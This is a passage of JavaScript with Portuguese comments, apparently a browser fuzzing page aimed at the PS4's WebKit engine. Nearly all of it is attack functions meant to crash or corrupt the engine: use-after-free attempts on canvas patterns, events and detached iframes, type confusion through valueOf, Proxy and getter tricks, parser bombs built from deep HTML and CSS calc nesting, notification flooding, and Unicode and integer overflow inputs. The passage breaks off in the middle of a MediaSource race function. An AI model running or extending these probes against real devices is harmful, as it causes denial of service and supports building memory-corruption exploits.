            log("Iniciando URL Component Overflow...");
            
            const payloads = [
                // Scheme gigante
                "a".repeat(10000) + "://google.com",
                // Host gigante
                "http://" + "b".repeat(20000) + ".com",
                // User/Pass gigante
                "http://" + "user:pass".repeat(5000) + "@google.com",
                // Protocolo aninhado inválido
                "view-source:".repeat(500) + "http://test.com"
            ];

            payloads.forEach((url, i) => {
                setTimeout(() => {
                    try {
                        log(`Tentativa ${i+1}: URL Malformada...`);
                        // O construtor URL faz o parsing imediato no C++
                        new URL(url);
                    } catch(e) {
                        // Erro esperado. Procuramos o crash.
                    }
                }, i * 200);
            });
            
            // Tenta navegação real via location (pode causar travamento de UI)
            setTimeout(() => {
                try {
                    log("Tentando navegação com protocolo lixo...");
                    window.location.href = "unknown-protocol-" + "X".repeat(5000) + ":";
                } catch(e) {}
            }, 2000);
        }
 function runNotificationBomb() {
            log("Iniciando Ataque ao Daemon de Notificação...");
            
            if (!("Notification" in window)) {
                log("API Notification não suportada.");
                return;
            }

            // Solicita permissão (pode falhar silenciosamente ou ser auto-concedida no PS4)
            Notification.requestPermission().then(perm => {
                log("Permissão: " + perm);
                
                try {
                    const hugeText = "A".repeat(5000); // 5KB de texto
                    const hugeIcon = URL.createObjectURL(new Blob(["B".repeat(1024*1024)], {type: "image/png"}));
                    
                    log("Enviando notificações em loop...");
                    
                    let i = 0;
                    const interval = setInterval(() => {
                        i++;
                        try {
                            // Dispara notificação e fecha rapidamente
                            const n = new Notification("SYSTEM ALERT " + i, {
                                body: hugeText + i,
                                icon: hugeIcon,
                                tag: "bomb" // Tenta substituir a anterior rapidamente (Race)
                            });
                            
                            // Tenta fechar antes de renderizar completamente
                            setTimeout(() => n.close(), 10); 
                            
                        } catch(e) {}
                        
                        if (i > 100) {
                            clearInterval(interval);
                            log("Ciclo de notificação concluído.");
                        }
                    }, 50);
                    
                } catch(e) {
                    log("Erro Notification: " + e.message);
                }
            });
        }

        // --- TESTE 2: Font Cache Exhaustion (libSceFontGsm) ---
        // Força o sistema a carregar e renderizar milhares de glifos Unicode diferentes.
        // O cache de texturas de fontes é limitado e partilhado.
        function runGlyphFlood() {
            log("Iniciando Inundação de Glifos (Font Cache)...");
            const el = document.getElementById('font-area');
            el.innerHTML = "";
            
            let charCode = 0;
            const chunkSize = 2000;
            
            const interval = setInterval(() => {
                try {
                    let s = "";
                    // Gera um bloco de 2000 caracteres Unicode sequenciais
                    for(let i=0; i<chunkSize; i++) {
                        s += String.fromCharCode(charCode++);
                    }
                    
                    // Adiciona ao DOM para forçar o renderizador a buscar o glifo na libSceFont
                    const span = document.createElement('span');
                    span.textContent = s;
                    
                    // Muda o estilo para forçar novas texturas (bold, italic, tamanhos)
                    span.style.fontSize = (Math.random() * 20 + 10) + "px";
                    if (Math.random() > 0.5) span.style.fontWeight = "bold";
                    
                    el.appendChild(span);
                    
                    // Força layout
                    const x = el.offsetWidth;
                    
                    // Limpa periodicamente o DOM, mas o cache do sistema pode não limpar tão rápido
                    if (el.childNodes.length > 50) el.innerHTML = "";
                    
                    if (charCode > 60000) { // Limite Unicode BMP
                        clearInterval(interval);
                        log("Flood Unicode finalizado.");
                    }
                    
                    if (charCode % 10000 === 0) log(`Carregados ${charCode} glifos...`);
                    
                } catch(e) {
                    log("Erro Font: " + e.message);
                    clearInterval(interval);
                }
            }, 50);
        }

        // --- TESTE 3: Canvas Pattern Use-After-Free ---
        // Cria um padrão a partir de um canvas, destrói o canvas fonte e tenta desenhar.
        // Ataca a gestão de vida dos recursos gráficos.
        function runPatternRace() {
            log("Armando Canvas Pattern UAF...");
            
            const src = document.getElementById('c_src');
            const dst = document.getElementById('c_dst');
            const sCtx = src.getContext('2d');
            const dCtx = dst.getContext('2d');
            
            // 1. Desenha algo na origem
            sCtx.fillStyle = "red";
            sCtx.fillRect(0, 0, 100, 100);
            
            try {
                // 2. Cria o padrão (referência à textura do src)
                const pattern = dCtx.createPattern(src, "repeat");
                
                // 3. O GOLPE: Redimensiona a origem para 0 (libera o buffer de pixels)
                log("Destruindo buffer de origem...");
                src.width = 0; 
                
                // Tenta preencher a memória com lixo rapidamente
                const trash = new Uint8Array(1024 * 1024).fill(0xCC);
                
                // 4. Usa o padrão (que aponta para o buffer liberado?)
                log("Desenhando com padrão morto...");
                dCtx.fillStyle = pattern;
                dCtx.fillRect(0, 0, 500, 500);
                
                log("Desenho concluído (Verifique glitches visuais).");
                
            } catch(e) {
                log("Erro Pattern: " + e.message);
            }
        }
 function runHTMLRecursion() {
            log("Gerando Bomba HTML (Deep Nesting)...");
            
            setTimeout(() => {
                try {
                    const depth = 15000; // Profundidade crítica para stacks de console
                    let html = "";
                    
                    // Gera <div><div>...
                    for(let i=0; i<depth; i++) html += "<div>";
                    html += "<b>BOOM</b>";
                    for(let i=0; i<depth; i++) html += "</div>";
                    
                    log(`Injetando HTML (${html.length} bytes)...`);
                    
                    // O GOLPE: innerHTML dispara o parser síncrono
                    document.getElementById('sandbox').innerHTML = html;
                    
                    log("HTML Parser sobreviveu.");
                    document.getElementById('sandbox').innerHTML = ""; // Limpa
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                }
            }, 100);
        }

        // --- TESTE 2: CSS calc() Nested Explosion ---
        // Cria uma expressão CSS matemática absurdamente profunda.
        // Ataca o avaliador de expressões do Style Engine.
        function runCSSCalcBomb() {
            log("Gerando Bomba Matemática CSS calc()...");
            
            setTimeout(() => {
                const depth = 2000;
                let style = "width: ";
                let suffix = "";
                
                // Gera calc(1px + calc(1px + ...
                for(let i=0; i<depth; i++) {
                    style += "calc(1px + ";
                    suffix += ")";
                }
                style += "1px" + suffix + ";";
                
                const div = document.createElement('div');
                
                log("Aplicando estilo complexo...");
                // O parser de CSS roda aqui
                div.style.cssText = style;
                document.body.appendChild(div);
                
                // Força o cálculo do layout
                const width = div.offsetWidth;
                
                log("CSS Engine processou o valor: " + width);
                document.body.removeChild(div);
            }, 100);
        }

        // --- TESTE 3: SVG Filter Chain Exhaustion ---
        // Cria um SVG com centenas de filtros encadeados.
        // Cada filtro aloca uma superfície de desenho temporária.
        function runSVGFilterChain() {
            log("Construindo Corrente de Filtros SVG...");
            
            const svgNS = "http://www.w3.org/2000/svg";
            const svg = document.createElementNS(svgNS, "svg");
            const filter = document.createElementNS(svgNS, "filter");
            filter.id = "chain";
            
            // Cria uma cadeia longa: Source -> Blur -> Blur -> ...
            let prevResult = "SourceGraphic";
            
            for(let i=0; i<200; i++) {
                const fe = document.createElementNS(svgNS, "feGaussianBlur");
                fe.setAttribute("in", prevResult);
                fe.setAttribute("stdDeviation", "0.5");
                fe.setAttribute("result", "res" + i);
                filter.appendChild(fe);
                prevResult = "res" + i;
            }
            
            svg.appendChild(filter);
            
            // Objeto para aplicar o filtro
            const rect = document.createElementNS(svgNS, "rect");
            rect.setAttribute("width", "500");
            rect.setAttribute("height", "500");
            rect.setAttribute("filter", "url(#chain)");
            
            svg.appendChild(rect);
            document.getElementById('sandbox').appendChild(svg);
            document.getElementById('sandbox').style.display = "block";
            
            log("Renderizando filtros... (Pode travar)");
            
            // Força render
            setTimeout(() => {
                const box = rect.getBBox();
                log("Renderização finalizada.");
                document.getElementById('sandbox').innerHTML = "";
            }, 500);
        }
function runFloatBomb() {
            log("Iniciando Math Parse Attack...");
            
            setTimeout(() => {
                try {
                    // 1. Número com precisão excessiva (Stack Overflow no parser?)
                    const hugeFloat = "0." + "1".repeat(50000) + "e-100";
                    
                    log("Parseando Float gigante...");
                    const val1 = parseFloat(hugeFloat);
                    
                    // 2. Número denormal próximo do limite de precisão (Hang?)
                    // 2.2250738585072012e-308 é famoso por travar engines antigos (PHP/Java)
                    // Vamos tentar variações
                    const magic = "2.225073858507201" + "1".repeat(1000) + "e-308";
                    const val2 = Number(magic);
                    
                    log("Math Parser sobreviveu. Valores: " + val1 + ", " + val2);
                    
                } catch(e) {
                    log("Erro Math: " + e.message);
                }
            }, 100);
        }

        // --- TESTE 2: Font Shaper Memory Corruption ---
        // Ataca a biblioteca de renderização de texto (HarfBuzz/CoreText).
        // Usa caracteres complexos (Zalgo/Árabe) com muitas features OpenType ativas.
        function runTextShaper() {
            log("Iniciando Text Shaper Stress...");
            const box = document.getElementById('sandbox');
            box.innerHTML = "";
            
            // Cria uma string "Zalgo" (muitos diacríticos empilhados)
            // Isso força o motor a calcular posições verticais complexas
            const base = "A";
            const marks = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B"; // Diacríticos
            
            let toxicText = "";
            for(let i=0; i<500; i++) {
                toxicText += base + marks.repeat(20); // 1 letra + 240 marcas
            }
            
            const div = document.createElement('div');
            div.className = "shaper";
            div.textContent = toxicText;
            
            log("Injetando Texto Complexo (Zalgo/OpenType)...");
            box.appendChild(div);
            
            // Força layout e medição
            setTimeout(() => {
                const width = div.offsetWidth;
                const height = div.offsetHeight;
                log(`Layout calculado: ${width}x${height}`);
                
                // Tenta alterar dinamicamente para forçar re-shape
                div.style.fontFeatureSettings = '"swsh" 1';
                
                log("Teste de Fonte concluído.");
                box.innerHTML = "";
            }, 100);
        }

        // --- TESTE 3: Compositing Layer Exhaustion ---
        // Cria milhares de elementos com 'transform: translateZ(0)'.
        // Cada um força o WebKit a alocar uma textura no Kernel Gráfico (Gnm).
        function runLayerExplosion() {
            log("Iniciando Explosão de Camadas (GnmDriver)...");
            const box = document.getElementById('sandbox');
            box.innerHTML = "";
            
            let count = 0;
            const maxLayers = 5000; // Tenta atingir o limite de handles do PS4
            
            const interval = setInterval(() => {
                // Cria lote de camadas
                const fragment = document.createDocumentFragment();
                for(let i=0; i<100; i++) {
                    const div = document.createElement('div');
                    div.className = "layer";
                    div.style.top = (i % 100) + "px";
                    div.style.left = (count % 100) + "px";
                    // Cor aleatória para forçar textura única
                    div.style.backgroundColor = `rgb(${count%255},0,0)`;
                    fragment.appendChild(div);
                    count++;
                }
                
                box.appendChild(fragment);
                
                if (count % 500 === 0) log(`Camadas alocadas: ${count}`);
                
                if (count >= maxLayers) {
                    clearInterval(interval);
                    log("Limite atingido. Verifique travamento do sistema.");
                    
                    // O GOLPE FINAL: Animar todas as camadas
                    // Força o compositor a enviar tudo para a GPU/CPU de uma vez
                    log("Animando camadas...");
                    box.style.transform = "scale(1.1)";
                }
            }, 20);
        }
function runUnicodeBomb() {
            log("Iniciando Ataque de Normalização Unicode...");
            
            try {
                // \uD800 é um "High Surrogate" sem par. É inválido sozinho.
                // Repetir isso milhares de vezes confunde algoritmos de normalização (NFC/NFD).
                const toxic = "\uD800".repeat(50000); 
                
                log("Normalizando string tóxica (50k chars)...");
                
                // O GOLPE: 'NFC' tenta combinar caracteres. Com input inválido,
                // o código C++ pode acessar memória inválida ou estourar o heap.
                const norm = toxic.normalize('NFC');
                
                log("Normalização concluída (Seguro). Tamanho: " + norm.length);
                
                // Tenta o inverso (NFD - Decomposição) para estressar a expansão
                const norm2 = toxic.normalize('NFD');
                log("Decomposição concluída.");

            } catch(e) {
                log("Erro Unicode: " + e.message);
            }
        }

        // --- TESTE 2: Intl.NumberFormat Type Confusion ---
        // Ataca a conversão de tipos durante a formatação.
        // Tenta mudar o valor numérico enquanto o C++ está processando a formatação.
        function runIntlLogicError() {
            log("Iniciando Intl Type Confusion...");
            
            const formatter = new Intl.NumberFormat('en-US', {
                style: 'currency',
                currency: 'USD'
            });

            const evil = {
                // O método valueOf é chamado pelo C++ para obter o número.
                valueOf: function() {
                    log("C++ pediu o valor. Tentando reentrada...");
                    // Tenta desalocar ou alterar o estado do formatador aqui
                    // (Em um exploit real, tentaríamos liberar a memória do formatter)
                    
                    // Retorna um valor que força notação científica ou NaN
                    return { toString: () => "1.0e1000" }; 
                }
            };

            try {
                log("Formatando objeto malicioso...");
                // Se o C++ não esperar que valueOf retorne outro objeto, pode crashar (bad_cast)
                formatter.format(evil);
                log("Intl sobreviveu.");
            } catch(e) {
                log("Erro Lógico Capturado: " + e.message);
            }
        }

        // --- TESTE 3: Date.parse Integer Underflow ---
        // Ataca as funções de tempo da libc (mktime/asctime).
        // Datas muito antigas ou distantes podem causar Underflow em inteiros de 32 bits.
        function runDateLogicCrash() {
            log("Testando Lógica de Data Extrema...");
            
            const badDates = [
                "2038-01-19T03:14:08Z", // O "Bug do ano 2038" (limite 32-bit)
                "-200000-01-01",        // Ano negativo extremo
                "1970-01-01T00:00:-1",  // Segundo negativo
                new Array(10000).join("9") + "-01-01" // Ano com overflow de buffer
            ];

            badDates.forEach(d => {
                try {
                    log(`Parseando: ${d.substring(0, 20)}...`);
                    const ts = Date.parse(d);
                    
                    // Tenta converter de volta para string para forçar o C++ (asctime_s)
                    if (!isNaN(ts)) {
                        new Date(ts).toISOString();
                        new Date(ts).toLocaleString('full'); // Força formatação complexa
                    }
                } catch(e) {
                    // RangeError é normal. Crash é o objetivo.
                }
            });
            log("Teste de Data finalizado.");
        }
 function runGhostDate() {
            log("Iniciando Ataque de Lógica Temporal...");
            
            try {
                // 1. O Bug do Ano 2038 (Limite de 32-bit com sinal)
                // Tenta 1 segundo após o fim do mundo Unix
                const crashDate = new Date("2038-01-19T03:14:08Z");
                crashDate.setSeconds(crashDate.getSeconds() + 1); 
                
                log("Testando Ano 2038+1...");
                // Força chamada ao sistema (toLocaleString usa libc)
                const s1 = crashDate.toLocaleString();
                
                // 2. Anos negativos extremos (Integer Underflow)
                const ancient = new Date();
                ancient.setFullYear(-200000); 
                log("Testando Ano -200.000...");
                const s2 = ancient.toISOString();

                // 3. "Data Fantasma" (Hora inexistente devido a DST)
                // Em muitos fusos, 2:30am não existe no dia da mudança.
                // O mktime pode retornar -1, que o JS pode não tratar.
                const dstGap = new Date(2023, 2, 12, 2, 30, 0); 
                log("Testando DST Gap (Hora inexistente)...");
                const s3 = dstGap.toString();

                log("Datas processadas (Seguro): " + s1);
                
            } catch(e) {
                log("Erro Data: " + e.message);
            }
        }

        // --- TESTE 2: Regex Unicode Expansion ---
        // Explora caracteres que mudam de tamanho quando normalizados (Case Folding).
        // O motor aloca X bytes, mas escreve Y bytes.
        function runRegexFolding() {
            log("Testando Regex Case-Folding Expansion...");
            
            try {
                // Caractere 'kelvin sign' (K) vira 'k' (mesmo tamanho)
                // Ligadura '?' (U+FB01) vira 'fi' (2 chars)
                // S longo '?' (U+017F) vira 's'
                
                // Cria string com milhares de caracteres que expandem
                const expander = "\uFB01".repeat(5000); // 5000 chars
                
                // Regex case-insensitive (/i) força o motor a converter a string
                // Se o cálculo de buffer considerar 1 char = 1 char, vai faltar espaço para o 'fi' (2 chars)
                const re = /fi/ig;
                
                log("Executando match em string expansiva...");
                
                // O GOLPE:
                const match = expander.match(re);
                
                if (match && match.length > 0) {
                    log("Match concluído. Resultados: " + match.length);
                } else {
                    log("Sem match (Lógica segura).");
                }
                
                // Teste Reverso: Turkish I (I com ponto vs sem ponto)
                // Pode causar confusão de bytes em certas tabelas de locale
                const turkish = "\u0130".repeat(1000);
                const re2 = /i/ig;
                turkish.match(re2);

            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 3: URI Component Lone Surrogate Decoding ---
        // Passa strings UTF-16 inválidas para funções de URI.
        // Tenta confundir o conversor C++ sobre onde a string termina.
        function runURIPoison() {
            log("Iniciando URI Surrogate Poisoning...");
            
            try {
                // Cria um "Lone Surrogate" (Metade de um caractere Emoji)
                // JS permite (é válido em UTF-16), mas C odeia (inválido em UTF-8/WChar)
                const badChar = String.fromCharCode(0xD800);
                
                // Monta uma URI onde o caractere ruim está no meio de dados críticos
                const toxicURI = "http://test.com/?q=" + badChar.repeat(1000) + "&param=val";
                
                log("Codificando URI Tóxica...");
                
                // encodeURI tenta validar. Se falhar na validação mas corromper a memória, crash.
                const encoded = encodeURI(toxicURI);
                
                log("Decodificando...");
                // decodeURIComponent é onde o buffer overflow costuma ocorrer
                // se o sistema tentar "consertar" o caractere inválido.
                const decoded = decodeURIComponent(encoded);
                
                log("Ciclo URI completo. Tamanho: " + decoded.length);
                
            } catch(e) {
                // URIError é a defesa padrão. Estamos procurando o que passa por ela ou crasha.
                log("Erro URI: " + e.message);
            }
        }

function runRegexSticky() {
            log("Iniciando RegExp Sticky Logic Attack...");
            
            try {
                // Cria uma regex com a flag 'y' (Sticky)
                const re = /A/y;
                
                // Objeto string falso que altera o estado da regex quando lido
                const evilString = {
                    toString: function() { return "AAA"; },
                    // Quando o motor pedir o comprimento ou caractere, mudamos o índice
                    get length() {
                        log("Engine leu length. Mudando lastIndex...");
                        re.lastIndex = 100; // Joga o índice para fora dos limites
                        return 3;
                    }
                };

                re.lastIndex = 0;
                
                // O GOLPE: Executar match. O motor valida lastIndex, depois lê a string.
                // Se a nossa mudança acontecer entre a validação e a leitura, temos um bug.
                const result = re.exec(evilString);
                
                log("RegExp finalizado. Resultado: " + result);
                log("LastIndex final: " + re.lastIndex);

            } catch(e) {
                log("Erro Lógico: " + e.message);
            }
        }

        // --- TESTE 2: JSON Reviver Object Corruption ---
        // Usa a função de 'reviver' do JSON.parse para modificar o objeto
        // enquanto ele ainda está a ser construído na memória.
        function runJSONReviver() {
            log("Iniciando JSON Reviver Attack...");
            
            const jsonStr = '{"a": 1, "b": 2, "c": 3, "target": [1, 2, 3]}';
            
            try {
                const result = JSON.parse(jsonStr, (key, value) => {
                    if (key === "a") {
                        log("Visitando chave 'a'. Deletando 'b' e 'target'...");
                        // O parser C++ tem referências internas para as próximas chaves.
                        // Tentar deletar 'this.target' pode deixar um ponteiro pendurado.
                        delete this.b;
                        delete this.target;
                        
                        // Tenta substituir por um objeto getter perigoso
                        this.c = { 
                            get val() { console.log("Acesso tardio!"); return 0; } 
                        };
                    }
                    return value;
                });
                
                log("Parse completo. Verificando integridade...");
                if (result.target === undefined) {
                    log("Sucesso Lógico: Chave apagada durante o parse.");
                }
                
            } catch(e) {
                log("Erro JSON: " + e.message);
            }
        }

        // --- TESTE 3: Array Shift Fast-Path Bailout ---
        // Ataca a otimização de arrays. O método 'shift' move todos os elementos.
        // Se interrompermos esse movimento com um Proxy ou Getter, o motor pode se perder.
        function runArrayShift() {
            log("Testando Array Fast Path Bailout...");
            
            try {
                const arr = [1, 2, 3, 4];
                
                // Transforma o índice 2 num 'buraco' com getter
                Object.defineProperty(arr, '2', {
                    get: function() {
                        log("Getter acionado durante shift! Destruindo array...");
                        arr.length = 0; // Esvazia o array no meio da operação
                        // Enche a memória com lixo para ocupar o lugar
                        arr.push(0x41414141); 
                        return "GATILHO";
                    }
                });

                log("Executando shift()...");
                // O shift vai ler 0, mover 1 para 0, ler 2... BOOM (getter acionado)
                // Se o motor C++ não verificar o tamanho novamente, vai escrever fora do buffer.
                arr.shift();
                
                log("Operação concluída. Array length: " + arr.length);
                log("Valor [0]: " + arr[0]);

            } catch(e) {
                log("Erro Array: " + e.message);
            }
        }
function runDateProxy() {
            log("Iniciando Date Proxy Logic Attack...");
            
            try {
                const target = new Date();
                const handler = {
                    get: function(obj, prop) {
                        if (prop === Symbol.toPrimitive || prop === "valueOf") {
                            log("C++ solicitou valor da Data. Injetando Lógica...");
                            // Retorna algo que não é número, tentando bugar a conversão para time_t
                            return function() { 
                                // Efeito colateral: Tenta invalidar o objeto original
                                obj.setTime(NaN); 
                                return {}; // Retorno inválido para numérico
                            };
                        }
                        return Reflect.get(obj, prop);
                    }
                };

                const proxy = new Proxy(target, handler);

                log("Formatando Data Proxy...");
                // Intl usa bibliotecas C++ estritas.
                const fmt = new Intl.DateTimeFormat("en-US");
                
                // O GOLPE: O formatador pede o valor, nós retornamos lixo.
                // Se o C++ não tratar a exceção de tipo aqui, crash.
                fmt.format(proxy);
                
                log("Date Proxy sobreviveu.");

            } catch(e) {
                log("Erro Lógico: " + e.message);
            }
        }

        // --- TESTE 2: Promise Microtask Starvation ---
        // Cria um loop de Microtasks que bloqueia a thread de UI mas mantém a CPU a 100%.
        // Tenta causar desincronia no IPC do Kernel sem crashar a aba imediatamente.
        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
            
            let count = 0;
            
            function loop() {
                count++;
                // Agenda a próxima microtarefa imediatamente
                Promise.resolve().then(loop);
                
                // A cada 100k ciclos, tenta fazer uma operação pesada de sistema
                if (count % 100000 === 0) {
                    // Tenta forçar uma syscall de tempo ou memória
                    new Date().toString(); 
                }
            }
            
            // Inicia a bomba
            loop();
        }

        // --- TESTE 3: Exception Unwinder Stack Smash ---
        // Ataca a libunwind (mecanismo de exceção C++).
        // Cria uma recursão profunda onde cada nível lança e captura uma exceção complexa.
        function runUnwindSmash() {
            log("Testando 'libunwind' Stack Limits...");
            
            function recursiveThrow(depth) {
                try {
                    if (depth > 0) {
                        recursiveThrow(depth - 1);
                    } else {
                        // Fundo da pilha. Lança erro inicial.
                        throw new Error("Start Unwind");
                    }
                } catch(e) {
                    // O GOLPE: No meio do "unwind", lançamos OUTRO erro complexo.
                    // Isso força a libunwind a lidar com exceções aninhadas na borda da pilha.
                    
                    // Cria URIError com string gigante para estressar memória durante o erro
                    try {
                        decodeURIComponent("%".repeat(1000)); 
                    } catch(err2) {
                        // Relança erro modificado
                        throw new Error("Nested: " + err2.message); 
                    }
                }
            }

            try {
                // Profundidade calibrada para WebKit PS4 (~5000 costuma ser o limite)
                recursiveThrow(4000);
                log("Unwind completado com segurança.");
            } catch(e) {
                log("Erro capturado no topo: " + e.message.substring(0, 50));
                if (e.message.includes("Stack")) log("ALERTA: Stack Overflow detectado!");
            }
        }
 function runNullByteURI() {
            log("Iniciando Null Byte Injection...");
            
            try {
                // Cria uma string que é válida em JS mas problemática em C
                // "Payload" + Nulo + "Lixo"
                // Se o C++ parar no Nulo, o cálculo de alocação pode estar errado.
                const toxic = "A".repeat(1000) + "%00" + "B".repeat(1000);
                
                log("Decodificando URI com Nulo embutido...");
                
                // decodeURIComponent chama mbstowcs internamente.
                const result = decodeURIComponent(toxic);
                
                log("Decodificação concluída.");
                log("Tamanho JS: " + result.length);
                
                // Verifica se o JS vê o byte nulo corretamente (código 0)
                if (result.charCodeAt(1000) === 0) {
                    log("JS preservou o byte nulo. (Verificar memória do processo)");
                }

                // Tenta usar essa string num contexto de sistema (ex: Título da página)
                document.title = result;

            } catch(e) {
                log("Erro URI: " + e.message);
            }
        }

        // --- TESTE 2: String.replace Calculation Overflow ---
        // Usa padrões de substituição especiais ($&) para expandir strings exponencialmente.
        // Tenta estourar o cálculo de tamanho (Integer Overflow) antes da alocação.
        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            
            try {
                let str = "test";
                
                // Expansão controlada
                // $& insere a própria string casada.
                // 'test'.replace(/test/, "$& $&") -> "test test" (Dobrou)
                
                const re = /.*/; // Casa tudo
                
                // Loop de expansão agressiva
                for(let i=0; i<30; i++) { // 2^30 é gigante
                    // Tenta forçar o motor a calcular um tamanho > 4GB
                    str = str.replace(re, "$&".repeat(2)); // Dobra a cada passo
                    
                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
                }
                
                log("String final gerada (Seguro).");
                
            } catch(e) {
                log("Erro Replace (Provável OOM): " + e.message);
            }
        }

        // --- TESTE 3: Number Precision Stack Smash ---
        // Ataca a função sprintf_s da libc com especificadores de precisão absurdos.
        // Tenta escrever muitos dígitos na pilha.
        function runPrecisionCrash() {
            log("Testando Precisão Numérica Extrema...");
            
            const targets = [
                1.23456789,
                -0.000000123,
                1e-100,
                NaN,
                Infinity
            ];

            targets.forEach(num => {
                try {
                    // Tenta pedir 1000 dígitos de precisão.
                    // O padrão IEEE 754 não tem isso tudo, mas a função C tem que preencher com zeros.
                    // Se o buffer na stack for pequeno (ex: 512 bytes), 1000 chars causam estouro.
                    
                    log(`Formatando ${num} com precisão 5000...`);
                    
                    // toPrecision usa dtoa/sprintf internamente
                    const res = num.toPrecision(500); 
                    
                    // toFixed é outra via
                    const res2 = num.toFixed(500);
                    
                    log("Sucesso (Seguro).");
                } catch(e) {
                    // RangeError é a defesa do JS. Crash é a falha do C++.
                    log("Erro Precision: " + e.message);
                }
            });
        }
function runEventPathUAF() {
            log("Iniciando Event Path Destruction...");
            const sandbox = document.getElementById('sandbox');
            sandbox.style.display = "block";
            sandbox.innerHTML = "";

            // Cria hierarquia: A > B > C
            const a = document.createElement('div');
            const b = document.createElement('div');
            const c = document.createElement('div');
            
            a.appendChild(b);
            b.appendChild(c);
            sandbox.appendChild(a);

            // Adiciona listener na fase de CAPTURA (desce do topo para o alvo)
            // O objetivo é remover 'b' antes que o evento suba de volta (Bubbling)
            a.addEventListener('click', function() {
                log("Captura em A detectada. Removendo B...");
                try {
                    a.removeChild(b);
                    // Tenta encher a memória onde 'b' estava
                    const junk = new Array(1000).fill(1.1);
                } catch(e) {}
            }, true); // true = Capture Phase

            // Adiciona listener em C para ver se o evento chega lá
            c.addEventListener('click', function() {
                log("Evento chegou em C (Alvo).");
            });

            // O GOLPE: Dispara o evento.
            // O WebKit já calculou o caminho A->B->C. 
            // Se removermos B, o caminho fica inválido?
            log("Disparando evento...");
            c.click();
            
            log("Ciclo de evento concluído.");
            sandbox.innerHTML = "";
        }

        // --- TESTE 2: Blob Slice 64-bit Overflow ---
        // Ataca a matemática de ponteiros de arquivo do sistema.
        function runBlobSliceCrash() {
            log("Testando Aritmética de Blob Slice...");
            
            try {
                // Cria um blob pequeno
                const blob = new Blob(["PAYLOAD"]);
                
                // Valores perigosos para inteiros de 64 bits (assinados e não assinados)
                const vectors = [
                    [0, 9223372036854775807], // Max Safe Integer (JS) -> Int64 Max
                    [0, -1],                  // Underflow comum
                    [100, 10],                // Start > End (Lógica)
                    [-9223372036854775800, -1] // Valores negativos extremos
                ];

                vectors.forEach((vec, i) => {
                    try {
                        log(`Slice ${i}: start=${vec[0]}, end=${vec[1]}`);
                        const sliced = blob.slice(vec[0], vec[1]);
                        
                        // Tenta ler o resultado. Se o tamanho foi mal calculado,
                        // o FileReader pode tentar ler memória fora do buffer.
                        const reader = new FileReader();
                        reader.readAsText(sliced);
                    } catch(e) {
                        log("Erro slice: " + e.message);
                    }
                });
                
                log("Teste de Blob finalizado.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 3: Zombie Iframe Access ---
        // Tenta acessar propriedades de uma janela que já foi fechada.
        function runZombieWindow() {
            log("Criando Janela Zumbi...");
            
            const ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            
            // Guarda referência para a 'window' do iframe
            const win = ifr.contentWindow;
            
            // O GOLPE: Remove o iframe (fecha a janela)
            document.body.removeChild(ifr);
            
            log("Iframe removido. Acessando propriedades mortas...");
            
            setTimeout(() => {
                try {
                    // Tenta acessar objetos complexos que dependem do C++
                    // 'history', 'location', 'frames', 'parent'
                    
                    const h = win.history; // Pode crashar se o objeto history foi destruído
                    log("History acessado (Type: " + typeof h + ")");
                    
                    win.location.href = "about:blank"; // Tenta navegar uma janela morta
                    log("Navegação solicitada em zumbi.");
                    
                } catch(e) {
                    log("Acesso bloqueado (Seguro): " + e.message);
                }
            }, 100);
        }
function runMatrixCrash() {
            log("Calculando Matriz 3D Tóxica...");
            const box = document.getElementById('box');
            box.style.display = "block";
            
            // Valores que causam problemas em float 32-bit e double
            const v1 = 1e-300; // Muito pequeno (denormal)
            const v2 = 1e300;  // Muito grande
            const v3 = "calc(1px / 0)"; // Divisão por zero CSS
            
            // Matriz singular (determinante zero) mas com valores extremos
            // matrix3d(a1, b1, c1, d1, ...)
            const matrix = `matrix3d(
                ${v2}, ${v1}, 0, 0,
                ${v1}, ${v2}, 0, 0,
                0, 0, 1, 0,
                ${v2}, ${v2}, 0, 1
            )`;
            
            log("Aplicando Transformação...");
            box.style.transform = matrix;
            
            // O GOLPE: Força o navegador a calcular onde o clique cairia (Hit Testing)
            // Isso obriga a inversão da matriz.
            setTimeout(() => {
                log("Forçando Hit Test (Cálculo Inverso)...");
                const rect = box.getBoundingClientRect();
                const elem = document.elementFromPoint(rect.x, rect.y);
                
                // Tenta aninhar transformações para estourar a precisão
                box.style.transform = matrix + " " + matrix;
                
                log("Matemática sobreviveu.");
                box.style.display = "none";
            }, 100);
        }

        // --- TESTE 2: XSLT Sort Type Confusion ---
        // Usa XSLT para ordenar dados, mas injeta tipos mistos para confundir o comparador.
        function runXSLTSort() {
            log("Iniciando XSLT Sort Attack...");
            
            const xmlContent = `
                <root>
                    <item id="1">A</item>
                    <item id="2">B</item>
                    <item id="3">C</item>
                </root>
            `;
            
            const xsltContent = `
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:for-each select="root/item">
                            <xsl:sort select="number(@id) div 0" data-type="number"/>
                            <xsl:value-of select="."/>
                        </xsl:for-each>
                    </xsl:template>
                </xsl:stylesheet>
            `;

            try {
                const parser = new DOMParser();
                const xmlDoc = parser.parseFromString(xmlContent, "text/xml");
                const xslDoc = parser.parseFromString(xsltContent, "text/xml");

                const processor = new XSLTProcessor();
                processor.importStylesheet(xslDoc);
                
                log("Executando Transformação...");
                const result = processor.transformToFragment(xmlDoc, document);
                
                log("Transformação concluída.");
            } catch(e) {
                log("Erro XSLT: " + e.message);
            }
        }

        // --- TESTE 3: MediaSource Buffer Race (UAF) ---
        // A mais perigosa. Tenta abortar uma operação de append de vídeo no meio.
        function runMSERace() {
            log("Iniciando MSE Buffer Race...");
            
            if (!window.MediaSource) {
                log("MediaSource API não suportada.");
                return;
            }

            const ms = new MediaSource();
            const url = URL.createObjectURL(ms);
            const video = document.createElement('video');
            video.src = url;
            
            ms.addEventListener('sourceopen', () => {
                log("Source aberta. Criando buffer...");
                try {
                    // Cria um SourceBuffer para vídeo (MIME type comum)
